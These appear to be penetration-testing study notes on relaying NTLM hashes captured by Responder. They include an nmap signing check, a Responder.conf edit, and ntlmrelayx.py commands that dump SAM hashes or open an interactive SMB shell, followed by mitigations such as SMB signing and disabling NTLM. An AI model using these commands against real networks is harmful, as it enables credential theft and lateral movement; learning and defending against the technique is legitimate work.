Instead of cracking hashes gathered with responder, we can instead relay those hashes to specific machines and potentially gain access.

Requirments:
SMB signing must be disabled or not enforced on the target (workstations typically dont)

Relayed user credentials must be admin on machine for any real value

use nmap to see Message signing enabled but not required

`nmap --script=smb2-security-mode.nse -p445 <IP> -Pn`

edit /etc/responder/Responder.conf

Turn off HTTP | SMB 
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On

### Dump SAM database
`ntlmrelayx.py -tf targets.txt -smb2support`

victim opens out ip address share

dumps SAM hashes

### Interactive
`ntlmrelayx.py -tf targets.txt -smb2support -i`

Victim opens attacker share IP

look for started interactive SMB client shell via TCP 127.0.0.1:11000

`nc 127.0.0.1 11000`

### Mitigation Strategies 

- Enable SMB Sioning on all devices
	- Pro: Completely stops the attack
	- Con: Can cause performance issues with file copies

- Disable NTLM authenication on the networks
	- Pro: Completely stops the attack
	- Con: If kerberos stops woking, Windows defaults back to NTLM

- Account tiering:
	- Pro: Limits domain admins to specific tasks (e.g only log onto servers with need for DA)
	- Con: Enforcing the poplicy may be difficult

- Local admin restriction:
	- Pro: Can prevent a lot of lateral movement
	- Con: Potential increase in the amount of service desk tickets
	